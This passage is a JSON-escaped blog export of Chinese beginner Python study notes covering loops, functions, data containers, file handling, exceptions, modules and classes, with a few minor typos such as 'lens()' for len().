src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-152-1024x542.png\"></p>\n<ul>\n<li>案例：九九乘法表（使用while循环）<ul>\n<li>使用print不换行：<code>print(&quot;Hello&quot;, end=&#39;&#39;)</code>不会换行</li>\n<li><code>\\t</code>：制表符</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-154-1024x543.png\"></p>\n<h4 id=\"for循环的嵌套应用\"><a href=\"#for循环的嵌套应用\" class=\"headerlink\" title=\"for循环的嵌套应用\"></a>for循环的嵌套应用</h4><ul>\n<li>基础语法<ul>\n<li>for循环和while循环的区别：<ul>\n<li>while循环的循环条件时自定义的，自行控制循环条件</li>\n<li>for循环是一种“轮询”机制，是对一批内容进行逐个处理</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-155-1024x539.png\"></p>\n<ul>\n<li>案例：数一数有几个a</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-156-1024x543.png\"></p>\n<ul>\n<li>range语句<ul>\n<li>作用：获取数字序列</li>\n<li>语法1：range(num)，从0开始到num结束（不含num本身）</li>\n<li>语法2：range(num1,num2)：从num1开始到num2结束（不含num2本身）</li>\n<li>语法3：range(num1,num2,step)：step表示步长</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-157-1024x543.png\"></p>\n<ul>\n<li>变量作用域<ul>\n<li>for循环中的临时变量，其作用域限定为循环内（规范上）</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"for循环的嵌套应用-1\"><a href=\"#for循环的嵌套应用-1\" class=\"headerlink\" title=\"for循环的嵌套应用\"></a>for循环的嵌套应用</h4><ul>\n<li>案例：九九乘法表</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-158-1024x546.png\"></p>\n<h4 id=\"循环中断：break和continue\"><a href=\"#循环中断：break和continue\" class=\"headerlink\" title=\"循环中断：break和continue\"></a>循环中断：break和continue</h4><ul>\n<li>continue：中断本次循环，直接进入下一次循环</li>\n<li>break：直接结束循环</li>\n</ul>\n<h2 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h2><h4 id=\"函数介绍\"><a href=\"#函数介绍\" class=\"headerlink\" title=\"函数介绍\"></a>函数介绍</h4><ul>\n<li>函数：是组织好的，可重复使用的，用来实现特定功能的代码段。</li>\n<li>函数lens()：计算字符串的长度</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-160-1024x543.png\"></p>\n<h4 id=\"函数的定义\"><a href=\"#函数的定义\" class=\"headerlink\" title=\"函数的定义\"></a>函数的定义</h4><ul>\n<li><p>语法：<code>def 函数名(传入参数):   函数体   return 返回值</code></p>\n</li>\n<li><p>调用函数：函数名()</p>\n</li>\n<li><p>注意事项：</p>\n<ul>\n<li>参数如不需要，可以省略</li>\n<li>返回值如不需要，可以省略</li>\n<li>函数必须先定义后使用</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-161-1024x541.png\"></p>\n<h4 id=\"函数的参数\"><a href=\"#函数的参数\" class=\"headerlink\" title=\"函数的参数\"></a>函数的参数</h4><ul>\n<li>传入参数的功能：在函数进行计算的时候，接收外部（调用时）提供的数据</li>\n<li>参数：<ul>\n<li>形式参数：函数声明将要使用的参数</li>\n<li>实际参数：函数在执行时真正使用的参数值</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-162-1024x543.png\"></p>\n<h4 id=\"函数的返回值\"><a href=\"#函数的返回值\" class=\"headerlink\" title=\"函数的返回值\"></a>函数的返回值</h4><ul>\n<li>函数返回值的定义：程序在完成事情后，最后给调用者的结果</li>\n<li>函数体在遇到return后就结束了，所以写在return后的代码不会执行</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-163-1024x544.png\"></p>\n<ul>\n<li>函数返回值之None类型<ul>\n<li>无返回值的函数，实际上就是返回了None这个字面量</li>\n<li>使用场景<ul>\n<li>函数返回值</li>\n<li>if判断</li>\n<li>变量定义</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-164-1024x538.png\"></p>\n<h4 id=\"函数说明文档\"><a href=\"#函数说明文档\" class=\"headerlink\" title=\"函数说明文档\"></a>函数说明文档</h4><p>对函数进行说明解释，帮助更好理解函数的功能。</p>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-165-1024x543.png\"></p>\n<h4 id=\"函数的嵌套调用\"><a href=\"#函数的嵌套调用\" class=\"headerlink\" title=\"函数的嵌套调用\"></a>函数的嵌套调用</h4><ul>\n<li>嵌套调用：一个函数的里面又调用了另外一个函数</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-166-1024x541.png\"></p>\n<h4 id=\"函数中的作用域\"><a href=\"#函数中的作用域\" class=\"headerlink\" title=\"函数中的作用域\"></a>函数中的作用域</h4><ul>\n<li>作用域：变量的作用范围（分为局部变量和全局变量）</li>\n<li>局部变量的作用：在函数体的内部，临时保存数据，即当函数完成后，则销毁局部变量</li>\n<li>全局变量：指的是在函数体内、外都能生效的变量</li>\n<li>global关键字：在函数内部声明变量为全局变量</li>\n</ul>\n<p>第一部分学完了，继续加油……</p>\n<p>如果文章有何不妥之处，请您指出。持续更新中……</p>\n","categories":["编程语言学习"],"tags":["编程语言","Python"]},{"title":"Python学习(二)","url":"/2022/10/02/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/","content":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>python数据容器<ul>\n<li>数据容器入门</li>\n<li>数据容器：list（列表）</li>\n<li>list的遍历</li>\n<li>数据容器：tuple（元组）</li>\n<li>数据容器：str（字符串）</li>\n<li>数据容器的切片</li>\n<li>数据容器：set（集合）</li>\n<li>数据容器：dict（字典、映射）</li>\n<li>数据容器的通用操作</li>\n</ul>\n</li>\n<li>python函数进阶<ul>\n<li>函数的多返回值</li>\n<li>函数的多种传参方式</li>\n<li>匿名函数</li>\n</ul>\n</li>\n<li>python的文件操作<ul>\n<li>文件的编码</li>\n<li>文件的读取</li>\n<li>文件的写入</li>\n<li>文件的追加</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"python数据容器\"><a href=\"#python数据容器\" class=\"headerlink\" title=\"python数据容器\"></a>python数据容器</h2><h4 id=\"数据容器入门\"><a href=\"#数据容器入门\" class=\"headerlink\" title=\"数据容器入门\"></a>数据容器入门</h4><ul>\n<li>python数据类型：一种可以容纳多份数据的数据类型，容纳的每一份数据称之为1个元素，每一个元素，可以是任意类型的数据，如字符串、数字、布尔等。</li>\n<li>数据容器根据特点的不同进行分类<ul>\n<li>是否支持重复元素</li>\n<li>是否可以修改</li>\n<li>是否有序</li>\n</ul>\n</li>\n<li>数据容器的五类：<ul>\n<li>列表（list）、元组（tuple）、字符串（str）、集合（set）、字典（dict）</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"数据容器：list（列表）\"><a href=\"#数据容器：list（列表）\" class=\"headerlink\" title=\"数据容器：list（列表）\"></a>数据容器：list（列表）</h4><ul>\n<li>列表的定义<ul>\n<li>列表内的每一个数据，称之为元素</li>\n<li>以<code>[]</code>作为标识</li>\n<li>列表内每一个元素之间用<code>,</code>隔开</li>\n<li>列表可以一个存储多个数据，且可以为不同的数据类型，支持嵌套。</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-168-1024x546.png\"></p>\n<ul>\n<li>列表的下标索引</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-170-1024x542.png\"><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-171-1024x543.png\"></p>\n<ul>\n<li>列表的常用操作方法<ul>\n<li><p>方法和函数功能一样，有传入参数，有返回值，只是方法的使用格式不同</p>\n<ul>\n<li>方法的使用：student &#x3D; Student()<br>num &#x3D; student.add(1, 2)</li>\n</ul>\n</li>\n<li><p>列表的查询功能</p>\n<ul>\n<li>功能：查找指定元素在列表中的下标，如果找不到，会报错ValueError<ul>\n<li>语法：列表.index(元素)，index就是列表对象（变量）内置的方法（函数）</li>\n</ul>\n</li>\n<li>功能：统计某元素在列表中的数量<ul>\n<li>语法：列表.count(元素)</li>\n</ul>\n</li>\n<li>功能：统计列表内，有多少元素<ul>\n<li>语法：len(列表)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>列表的修改功能</p>\n<ul>\n<li>功能：修改特点位置（索引）的元素值<ul>\n<li>语法：列表[下标] &#x3D; 值</li>\n</ul>\n</li>\n<li>功能：插入元素<ul>\n<li>语法：列表.insert(下标,元素)，在指定的下标位置，插入指定的元素</li>\n</ul>\n</li>\n<li>功能：追加单个元素<ul>\n<li>语法：列表.append(元素)，将指定元素，追加到列表的尾部</li>\n</ul>\n</li>\n<li>功能：追加一批元素<ul>\n<li>语法：列表.extend(其他数据容器)，将其他数据容器的内容取出，依次追加到列表尾部</li>\n</ul>\n</li>\n<li>功能：元素的删除<ul>\n<li>语法1：del 列表[下标]</li>\n<li>语法2：列表.pop(下标)</li>\n</ul>\n</li>\n<li>功能：删除某元素在列表中的第一个匹配值<ul>\n<li>语法：列表.remove(元素)</li>\n</ul>\n</li>\n<li>功能：清空列表内容<ul>\n<li>语法：列表.clear()</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-172-1024x543.png\"><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-173-1024x543.png\"><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-174-1024x542.png\"></p>\n<ul>\n<li>列表的特点<ul>\n<li>可以容纳多个元素</li>\n<li>可以容纳不同类型的元素</li>\n<li>数据是有序存储的（有下标序号）</li>\n<li>允许重复数据存在</li>\n<li>可以修改（增加或删除元素等）</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"list的遍历\"><a href=\"#list的遍历\" class=\"headerlink\" title=\"list的遍历\"></a>list的遍历</h4><ul>\n<li>使用while循环对列表进行遍历</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-175-1024x543.png\"></p>\n<ul>\n<li>使用for循环来遍历列表</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-176-1024x543.png\"></p>\n<h4 id=\"数据容器：tuple（元组）\"><a href=\"#数据容器：tuple（元组）\" class=\"headerlink\" title=\"数据容器：tuple（元组）\"></a>数据容器：tuple（元组）</h4><ul>\n<li>元组一旦定义完成，就不可以被修改</li>\n<li>使用小括号定义变量</li>\n<li>元组定义单个元素的时候，后面需要加上一个括号</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-1-1024x543.png\"></p>\n<ul>\n<li>index()：查找某个元素，如果数据存在返回对应的下标，否则报错</li>\n<li>count()：统计某个数据在当前元组出现的次数</li>\n<li>len(元组)：统计元组内的元素个数</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-2-1024x542.png\"></p>\n<ul>\n<li>元组的遍历：while</li>\n<li>元组的遍历：for</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-3-1024x541.png\"></p>\n<ul>\n<li>注意事项<ul>\n<li>不可以修改元素的内容，否则会报错</li>\n<li>可以修改元组内的list的内容（修改元素、增加、删除、反转等）</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"数据容器：str（字符串）\"><a href=\"#数据容器：str（字符串）\" class=\"headerlink\" title=\"数据容器：str（字符串）\"></a>数据容器：str（字符串）</h4><ul>\n<li>字符串也是支持下标索引的</li>\n<li>字符串是无法修改的数据容器</li>\n<li>index()：与前面的index是一样的</li>\n<li>字符串的替换<ul>\n<li>语法：字符串.replace(字符串1,字符串2)</li>\n<li>功能：将字符串内的全部：字符串1替换为字符串2</li>\n<li>注意：不是修改字符串本身，而是得到一个新字符串</li>\n</ul>\n</li>\n<li>字符串的切割<ul>\n<li>语法：字符串.split(分隔符字符串)</li>\n<li>功能：按照指定的分隔符字符串，将字符串划分为多个字符串，并存入列表对象中</li>\n<li>注意：字符串本身不变，而是得到了一个列表对象</li>\n</ul>\n</li>\n<li>字符串的规整操作（去前后指定字符串）<ul>\n<li>语法：字符串.strip(字符串)</li>\n<li>不传入参数默认去掉首尾空格</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-4-1024x542.png\"></p>\n<ul>\n<li>统计字符串中某字符出现的次数：count()</li>\n<li>字符串的长度：len()</li>\n<li>遍历字符串：跟上面的一样</li>\n</ul>\n<h4 id=\"数据容器的切片\"><a href=\"#数据容器的切片\" class=\"headerlink\" title=\"数据容器的切片\"></a>数据容器的切片</h4><ul>\n<li>序列：内容连续、有序、可使用下标索引的一类数据容器</li>\n<li>列表、元组、字符串都可以视为序列</li>\n<li>切片：<ul>\n<li>概念：从一个序列中，取出来一个子序列</li>\n<li>语法：序列[起始下标:结束下标:步长]</li>\n<li>表示从序列中，从指定位置开始，依次取出元素，到指定位置结束，得到一个新序列</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-51-1024x540.png\"></p>\n<h4 id=\"数据容器：set（集合）\"><a href=\"#数据容器：set（集合）\" class=\"headerlink\" title=\"数据容器：set（集合）\"></a>数据容器：set（集合）</h4><ul>\n<li><p>集合最大的特点结束不支持重复元素，并且内容是无序的</p>\n</li>\n<li><p>语法：使用<code>&#123;&#125;</code></p>\n</li>\n<li><p>集合的常用操作-修改</p>\n<ul>\n<li>集合是无序的，所以集合不支持下标索引访问，但是集合和列表一样，是允许被修改的</li>\n<li>添加新元素<ul>\n<li>add：集合.add(元素)</li>\n</ul>\n</li>\n<li>移除元素<ul>\n<li>remove：集合.remove(元素)</li>\n</ul>\n</li>\n<li>从集合中随机取出元素<ul>\n<li>pop：集合.pop()</li>\n<li>结果：会得到一个元素的结果，同时集合本身被修改，元素被移除。</li>\n</ul>\n</li>\n<li>清空元素<ul>\n<li>clear：集合.clear()</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>集合的常用操作</p>\n<ul>\n<li>取出两个集合的差集<ul>\n<li>语法：集合1.difference(集合2)</li>\n<li>功能：取出集合1和集合2的差集（集合1有而集合2没有的）</li>\n<li>结果：得到一个新集合，集合1和集合2不变</li>\n</ul>\n</li>\n<li>消除两个集合的差集<ul>\n<li>语法：集合1.difference_update(集合2)</li>\n<li>功能：对比集合1和集合2，在集合1内，删除和集合2相同的元素</li>\n<li>结果：集合1被修改，集合2不变</li>\n</ul>\n</li>\n<li>两个集合合并<ul>\n<li>集合.union(集合2)</li>\n<li>功能：将集合1和集合2组合成新集合</li>\n<li>结果：得到新集合，集合1和集合2不变</li>\n</ul>\n</li>\n<li>统计集合元素数量len<ul>\n<li>len(集合)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>遍历</p>\n<ul>\n<li>集合不支持下标索引，不能使用while循环</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-52-1024x539.png\"></p>\n<h4 id=\"数据容器：dict（字典、映射）\"><a href=\"#数据容器：dict（字典、映射）\" class=\"headerlink\" title=\"数据容器：dict（字典、映射）\"></a>数据容器：dict（字典、映射）</h4><ul>\n<li>字典的定义<ul>\n<li>可以使用字典，实现用key取出value的操作</li>\n<li>定义：使用<code>&#123;&#125;</code>，不过存储的元素是一个个的<code>键值对</code>，dict也可以定义</li>\n<li>不可以使用下标索引，通过key值去得到value值</li>\n<li>字典的key和value可以是任意数据类型（key不可以为字典）</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-54-1024x539.png\"></p>\n<ul>\n<li>字典的常用操作<ul>\n<li>新增元素<ul>\n<li>语法：字典[key]&#x3D;value</li>\n<li>结果：字典被修改，新增了元素</li>\n</ul>\n</li>\n<li>更新元素<ul>\n<li>语法：字典[key]&#x3D;value</li>\n<li>结果：字典被修改，元素被更新</li>\n<li>注意：字典key不可以重复，所以对已存在的key进行上述操作，就是更新value的值</li>\n</ul>\n</li>\n<li>删除元素<ul>\n<li>语法：字典.pop(key)</li>\n<li>结果：获取指定key的value，同时字典被修改，指定key的数据被删除</li>\n</ul>\n</li>\n<li>清空元素<ul>\n<li>字典.clear()</li>\n</ul>\n</li>\n<li>获取全部key<ul>\n<li>语法：字典.keys()</li>\n<li>结果：得到字典中的全部key</li>\n</ul>\n</li>\n<li>获取字典的元素数量<ul>\n<li>len()</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-56-1024x544.png\"></p>\n<ul>\n<li>字典的特点总结：<ol>\n<li>可以容纳多个数据</li>\n<li>可以容纳不同类型的数据</li>\n<li>每一份数据都是key-value的键值对</li>\n<li>可以通过key获取value，key不可重复（重复会覆盖）</li>\n<li>不支持下标索引</li>\n<li>可以修改（增加或删除更新元素）</li>\n</ol>\n</li>\n</ul>\n<h4 id=\"数据容器的通用操作\"><a href=\"#数据容器的通用操作\" class=\"headerlink\" title=\"数据容器的通用操作\"></a>数据容器的通用操作</h4><ul>\n<li>遍历上：<ul>\n<li>五类数据容器都支持for循环</li>\n<li>只有列表、元组、字符串支持while循环，集合、字典不支持</li>\n</ul>\n</li>\n<li>len(容器)</li>\n<li>max(容器)：最大元素</li>\n<li>min(容器)：最小函数</li>\n<li>容器的通用转换功能<ul>\n<li>list(容器)：将给定容器转换为列表</li>\n<li>str(容器)：将给定容器转换为字符串</li>\n<li>tuple(容器)：将给定容器转换为元组</li>\n<li>set(容器)：将给定容器转换为集合</li>\n</ul>\n</li>\n<li>容器通用排序<ul>\n<li>sorted(容器,[reverse&#x3D;True])：将给定容器进行排序</li>\n<li>reverse表示反转</li>\n<li>排序的结果会变成列表对象</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"python函数进阶\"><a href=\"#python函数进阶\" class=\"headerlink\" title=\"python函数进阶\"></a>python函数进阶</h2><h4 id=\"函数的多返回值\"><a href=\"#函数的多返回值\" class=\"headerlink\" title=\"函数的多返回值\"></a>函数的多返回值</h4><ul>\n<li>函数的多返回值的数据类型没有要求</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-57-1024x539.png\"></p>\n<h4 id=\"函数的多种传参方式\"><a href=\"#函数的多种传参方式\" class=\"headerlink\" title=\"函数的多种传参方式\"></a>函数的多种传参方式</h4><ul>\n<li>函数参数种类<ul>\n<li>位置参数：<ul>\n<li>调用函数时根据函数定义的参数位置来传递参数</li>\n<li>注意：顺序和个数必须一致</li>\n</ul>\n</li>\n<li>关键字参数：<ul>\n<li>函数调用时通过<code>键=值</code>的方式传参</li>\n<li>函数调用时，如果有位置参数时，位置参数必须在关键字参数的前面，但关键字参数之间不存在先后顺序</li>\n</ul>\n</li>\n<li>缺省参数：<ul>\n<li>也叫默认参数，用于定义函数，为参数提供默认值，调用时可以不传则会以默认值传入</li>\n<li>设置默认值的参数必须放在后面</li>\n</ul>\n</li>\n<li>不定长参数：<ul>\n<li>也叫可变参数，用于不确定调用的时候会传递多少个参数（不传参也可以）</li>\n<li>不定长参数的类型<ul>\n<li>位置传递：使用<code>*</code></li>\n<li>关键字传递：使用<code>**</code></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-58-1024x539.png\"></p>\n<h4 id=\"匿名函数\"><a href=\"#匿名函数\" class=\"headerlink\" title=\"匿名函数\"></a>匿名函数</h4><ul>\n<li>函数作为参数传递<ul>\n<li>将函数自身传递到其他函数内</li>\n<li>函数传入的作用：传入计算逻辑，而非传入数据</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-59-1024x543.png\"></p>\n<ul>\n<li>lambda匿名函数<ul>\n<li>函数定义的类型：<ul>\n<li>def关键字，定义带有名称的函数，可以重复使用</li>\n<li>lambda关键字，可以定义匿名的函数（无名称），只可以临时使用一次</li>\n</ul>\n</li>\n<li>匿名函数的定义语法：<ul>\n<li>lambda 传入参数:函数体(一行代码)</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-60-1024x548.png\"></p>\n<h2 id=\"python的文件操作\"><a href=\"#python的文件操作\" class=\"headerlink\" title=\"python的文件操作\"></a>python的文件操作</h2><h4 id=\"文件的编码\"><a href=\"#文件的编码\" class=\"headerlink\" title=\"文件的编码\"></a>文件的编码</h4><ul>\n<li>常用的编码：UTF-8、GBK</li>\n</ul>\n<h4 id=\"文件的读取\"><a href=\"#文件的读取\" class=\"headerlink\" title=\"文件的读取\"></a>文件的读取</h4><ul>\n<li>文件的操作主要包括打开、关闭、读、写等操作</li>\n<li>打开文件：open(name,mode,encoding)<ul>\n<li>name：是要打开的目标文件的字符串（可以包含文件所在的具体路径）</li>\n<li>mode：设置打开文件的模式（访问模式）：只读<code>(r)</code>、写入<code>(w)</code>、追加<code>(a)</code>等</li>\n<li>encoding：编码格式</li>\n</ul>\n</li>\n<li>读操作相关方法<ul>\n<li>read()方法：文件对象.read(num)<ul>\n<li>num表示要从文件中读取的数据的长度（单位是字节），如果没有传入num，那么就表示读取文件中所有的数据。</li>\n</ul>\n</li>\n<li>readlines()方法：<ul>\n<li>读取多行内容</li>\n<li>可以按照行的方式把整个文件中的内容进行一次性读取，并且返回的是一个<code>列表</code>，其中每一行的数据为一个元素</li>\n</ul>\n</li>\n<li>readline()方法<ul>\n<li>一次读取一行内容</li>\n</ul>\n</li>\n<li>for循环读取文件行</li>\n<li>close()：关闭文件对象</li>\n<li>with open语法：自动完成对文件的close</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-61-1024x543.png\"></p>\n<h4 id=\"文件的写入\"><a href=\"#文件的写入\" class=\"headerlink\" title=\"文件的写入\"></a>文件的写入</h4><ul>\n<li>write()：文件写入</li>\n<li>flush()：内容刷新</li>\n<li>注意：<ul>\n<li>w模式，文件不存在，会创建新文件</li>\n<li>w模式，文件存在，会清空原有文件</li>\n<li>close()方法，带有flush()方法的功能</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"文件的追加\"><a href=\"#文件的追加\" class=\"headerlink\" title=\"文件的追加\"></a>文件的追加</h4><ul>\n<li>模式替换为a</li>\n<li>文件存在会追加</li>\n<li>文件不存在会创建文件</li>\n<li>可以使用”\\n”来写入换行符</li>\n</ul>\n<p>第二部分学完了，继续加油……</p>\n<p>如果文章有何不妥之处，请您指出。持续更新中……</p>\n","categories":["编程语言学习"],"tags":["编程语言","Python"]},{"title":"Python学习(三)","url":"/2022/10/10/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/","content":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>python异常、模块与包<ul>\n<li>异常</li>\n<li>python模块</li>\n<li>python包</li>\n</ul>\n</li>\n<li>小杂记<ul>\n<li>json数据格式</li>\n<li>pyecharts模块介绍及入门</li>\n</ul>\n</li>\n<li>面向对象<ul>\n<li>成员方法</li>\n<li>构造方法</li>\n<li>其他内置方法</li>\n<li>封装</li>\n<li>继承</li>\n<li>类型注解（不完整）</li>\n<li>多态</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"python异常、模块与包\"><a href=\"#python异常、模块与包\" class=\"headerlink\" title=\"python异常、模块与包\"></a>python异常、模块与包</h2><h4 id=\"异常\"><a href=\"#异常\" class=\"headerlink\" title=\"异常\"></a>异常</h4><ul>\n<li>捕获异常<ul>\n<li>语法：使用try:可能发生的错误的代码except:如果出现异常执行的代码</li>\n</ul>\n</li>\n<li>捕获指定异常<ul>\n<li>except指定异常</li>\n<li>注意事项：<ul>\n<li>如果尝试执行的代码的异常类型和要捕获的异常类型不一致，则无法捕获异常</li>\n<li>一般try下方只放一行参试执行的代码</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>捕获多个异常<ul>\n<li>使用括号</li>\n</ul>\n</li>\n<li>捕获所有异常<ul>\n<li><code>Exception</code></li>\n</ul>\n</li>\n<li>异常的finally<ul>\n<li>finally表示是无论是否异常都要去执行的代码</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-78-1024x353.png\"><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-79-1024x541.png\"></p>\n<ul>\n<li>异常的传递<ul>\n<li>异常是会传递的</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"python模块\"><a href=\"#python模块\" class=\"headerlink\" title=\"python模块\"></a>python模块</h4><ul>\n<li>模块的导入<ul>\n<li>模块就是一个python文件</li>\n<li>导入语法：<code>[from 模块名] import [模块 | 类 | 变量 | 函数 | *] [as 别名]</code></li>\n<li>as别名：改名的作用</li>\n</ul>\n</li>\n<li>自定义模块<ul>\n<li>自己写一个文件实现某个功能，模块名就是文件名</li>\n<li><code>__main__：if __main__ = &quot;__main__&quot;</code>表示，只有当程序是直接执行的才会进入if内部，如果是被导入的，则if无法进入</li>\n<li><strong>all__：当使用<code>from xxx import *</code>导入时，只能导入这个列表中的元素，__all</strong> &#x3D; [‘xxx’]</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"python包\"><a href=\"#python包\" class=\"headerlink\" title=\"python包\"></a>python包</h4><ul>\n<li>包：就是一个文件夹，<code>__init__.py</code></li>\n<li>安装第三方包：使用pip<ul>\n<li>国内镜像（清华）：<a href=\"https://pypi.tuna.tsinghua.edu.cn/simple\">https://pypi.tuna.tsinghua.edu.cn/simple</a></li>\n<li>语法：pip install -i <a href=\"https://pypi.tuna.tsinghua.edu.cn/simple\">https://pypi.tuna.tsinghua.edu.cn/simple</a> 包名称</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"小杂记\"><a href=\"#小杂记\" class=\"headerlink\" title=\"小杂记\"></a>小杂记</h2><h4 id=\"json数据格式\"><a href=\"#json数据格式\" class=\"headerlink\" title=\"json数据格式\"></a>json数据格式</h4><ul>\n<li>是一种轻量级的数据交互格式，可以按照JSON指定的格式去组织和封装数据，其本质上是一个带有特定格式的字符串</li>\n<li>主要功能：负责不同编程语言中的数据传递和交互，充当翻译官的作用</li>\n<li>python和JSON的相互转换：</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-80-1024x544.png\"></p>\n<h4 id=\"pyecharts模块介绍及入门\"><a href=\"#pyecharts模块介绍及入门\" class=\"headerlink\" title=\"pyecharts模块介绍及入门\"></a>pyecharts模块介绍及入门</h4><ul>\n<li>模块的作用：做出数据可视化的模块</li>\n<li>官网：<a href=\"http://pyecharts.org/\">pyecharts</a><a href=\"http://pyecharts.org/\">.org</a>和<a href=\"http://gallery.pyecharts.org/\">gallery.pyecharts.org</a></li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-83-1024x541.png\"></p>\n<h2 id=\"面向对象\"><a href=\"#面向对象\" class=\"headerlink\" title=\"面向对象\"></a>面向对象</h2><h4 id=\"成员方法\"><a href=\"#成员方法\" class=\"headerlink\" title=\"成员方法\"></a>成员方法</h4><ul>\n<li>class是关键字，表示定义类了</li>\n<li>类的属性，即定义在类中的变量（成员变量）</li>\n<li>类型行为，即定义在类中的函数（成员方法）</li>\n<li>创建类对象的语法：<code>对象 = 类名称()</code></li>\n<li>self关键字<ul>\n<li>必须填写的</li>\n<li>他用来表示类对象自身的意思</li>\n<li>当我们使用类对象调用方法时，self会自动被python传入</li>\n<li><code>在方法内部，想要访问类的成员变量，必须使用self</code></li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-85-1024x540.png\"></p>\n<h4 id=\"构造方法\"><a href=\"#构造方法\" class=\"headerlink\" title=\"构造方法\"></a>构造方法</h4><ul>\n<li>python类可以使用__init__()方法，称之为构造方法</li>\n<li>实现：<ul>\n<li>在创建类对象（构造类）的时候，会自动执行</li>\n<li>在创建类对象（构造类）的时候，会传入参数自动传递给__init__方法使用</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-86-1024x545.png\"></p>\n<h4 id=\"其他内置方法\"><a href=\"#其他内置方法\" class=\"headerlink\" 